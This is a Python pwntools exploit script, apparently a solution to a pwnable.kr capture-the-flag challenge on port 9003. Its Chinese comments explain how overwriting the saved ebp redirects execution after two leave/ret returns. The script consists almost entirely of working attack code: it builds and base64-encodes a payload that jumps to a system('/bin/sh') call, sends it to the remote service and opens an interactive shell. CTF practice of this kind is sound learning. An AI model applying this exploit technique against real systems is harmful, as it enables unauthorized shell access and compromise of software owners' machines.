#coding=utf-8

from pwn import *
r = remote('pwnable.kr',9003)
context(log_level = 'debug')

input_addr = 0x811eb3c #0x811eb40 - 4    这里是把ebp覆盖为输入缓冲的下4字节，这样在下一次函数返回的时候，这个input_addr指向的位置的上4个字节就会被pop到eip中(ebp+4)

system_addr = 0x8049284 #这个是system("/bin/sh");的地址

payload = p32(system_addr) + p32(0xb1b1b1b1) + p32(input_addr)

payload = b64e(payload)

r.sendline(payload)

r.interactive()

'''
这题考察当返回地址无法覆盖，但可以覆盖ebp的时候应该怎么解决：将ebp覆盖为你想要的返回地址的存放位置-4
这样在两次函数调用返回(leave ret)之后，被覆盖的ebp地址+4就会被pop到eip中
所以把一开始的ebp地址设置成你输入的（在缓冲区上）的想要的返回地址的-4字节，就可以达成在两次返回后跳转到返回地址的目的

'''